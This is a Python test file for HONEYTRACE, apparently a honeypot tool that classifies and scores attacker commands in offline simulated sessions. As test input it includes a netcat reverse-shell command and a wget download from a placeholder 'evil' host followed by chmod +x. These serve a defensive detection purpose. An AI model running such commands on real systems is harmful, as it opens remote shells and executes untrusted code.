"""Smoke tests for HONEYTRACE (offline, no sockets)."""

import io
import json
import os
import sys

import pytest

# Make the package importable when run from anywhere.
_PKG_PARENT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, _PKG_PARENT)

from honeytrace import TOOL_NAME, TOOL_VERSION
from honeytrace.cli import main
from honeytrace.core import (
    SERVICE_PROFILES,
    classify_command,
    simulate_session,
    parse_events,
    analyze_events,
)

DEMO = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                    "demos", "01-basic")


def test_metadata():
    assert TOOL_NAME == "honeytrace"
    assert TOOL_VERSION.count(".") == 2


def test_services_present():
    for s in ("ssh", "rdp", "smb", "http"):
        assert s in SERVICE_PROFILES
    assert SERVICE_PROFILES["ssh"].port == 22


def test_classify_reverse_shell_and_recon():
    rs = classify_command("nc 1.2.3.4 4444 -e /bin/sh")
    assert rs["tactic"] == "command-and-control"
    assert rs["severity"] >= 8
    recon = classify_command("whoami")
    assert recon["tactic"] == "discovery"
    assert classify_command("ls -la")["tag"] == "noise"


def test_simulate_critical_session():
    rep = simulate_session("ssh", [
        "uname -a",
        "wget http://evil/x -O /tmp/x",
        "chmod +x /tmp/x",
        "nc 1.2.3.4 4444 -e /bin/sh",
    ])
    assert rep.command_count == 4
    assert rep.threat_score > 40
    assert rep.verdict == "critical"
    # deterministic: same inputs -> same synthetic IP + session id
    rep2 = simulate_session("ssh", ["uname -a", "wget http://evil/x -O /tmp/x",
                                    "chmod +x /tmp/x",
                                    "nc 1.2.3.4 4444 -e /bin/sh"])
    assert rep.session_id == rep2.session_id
    assert rep.src_ip == rep2.src_ip


def test_simulate_unknown_service_raises():
    with pytest.raises(ValueError):
        simulate_session("telnet", ["ls"])


def test_parse_and_analyze_demo_log():
    with open(os.path.join(DEMO, "events.jsonl"), encoding="utf-8") as fh:
        events = parse_events(fh.read().splitlines())
    assert len(events) == 11
    reports = analyze_events(events)
    by_ip = {r.src_ip: r for r in reports}
    # The C2/dropper IP is the most dangerous and sorts first.
    assert reports[0].src_ip == "185.220.101.7"
    assert by_ip["185.220.101.7"].verdict == "critical"
    # Benign internal browsing scores low.
    assert by_ip["10.0.0.55"].verdict in ("benign", "low")


def test_parse_rejects_malformed_json():
    with pytest.raises(ValueError):
        parse_events(['{"ts": "x"', "not json at all"])


def test_cli_version(capsys):
    with pytest.raises(SystemExit) as exc:
        main(["--version"])
    assert exc.value.code == 0
    assert TOOL_VERSION in capsys.readouterr().out


def test_cli_simulate_json_exit_code(capsys):
    rc = main(["--format", "json", "simulate", "ssh",
               "--script", os.path.join(DEMO, "ssh_session.txt")])
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert payload["verdict"] == "critical"
    assert payload["command_count"] >= 7
    # critical/high -> exit 2 for alert pipelines
    assert rc == 2


def test_cli_analyze_stdin(monkeypatch, capsys):
    with open(os.path.join(DEMO, "events.jsonl"), encoding="utf-8") as fh:
        data = fh.read()
    monkeypatch.setattr("sys.stdin", io.StringIO(data))
    rc = main(["--format", "json", "analyze", "-"])
    payload = json.loads(capsys.readouterr().out)
    assert payload["event_count"] == 11
    assert payload["sources"][0]["src_ip"] == "185.220.101.7"
    assert rc == 2


def test_cli_analyze_missing_file_exit_1():
    rc = main(["analyze", os.path.join(DEMO, "does_not_exist.jsonl")])
    assert rc == 1
